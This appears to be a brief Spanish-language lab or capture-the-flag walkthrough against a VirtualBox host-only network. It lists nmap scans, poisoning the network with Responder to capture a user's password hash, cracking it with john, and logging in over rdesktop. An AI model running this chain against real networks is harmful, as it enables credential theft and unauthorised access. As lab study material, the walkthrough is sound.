User.txt

Empezamos verificando que se ha creado una interfaz de red llamada vboxnet0:
    - ifconfig

Empezamos escaneado la red con nmap:
    - Descubrir cuantos hosts hay -> nmap 192.168.56.0/24 -sn -T5
    - Escaneado de todos los puertos -> nmap -p- -sS --min-rate 5000 --open -vvv IP -oN ports 
    - Escaneo en profundidad de los puertos abiertos -> nmap -p(lista de puestos) -sCV --min-rate 5000 IP (Ej: nmap -p22,80 -sCV --min-rate 5000 IP )
 
 No hay nada interesante. Probamos hacer un nmap pero ahora por UDP:
    - sudo nmap -sU --top-ports 1000 -T5 IP

Tampoco vemos nada.

Probamos a envenenar la red:
    - sudo responder -I Interface -v -> Interface = vboxnet0 
Esperamo sun rato y aparece un hash de un usuario. Esto se debe a que un usuario a intentado acceder a un recurso compartido a nivel de red y este recurso no existe.

Nos guardamos el hash y probamos a romperlo:
    - john -w passwords.txt hash

Nos conectamos al PC:
    - rdesktop -u user -p pass IP
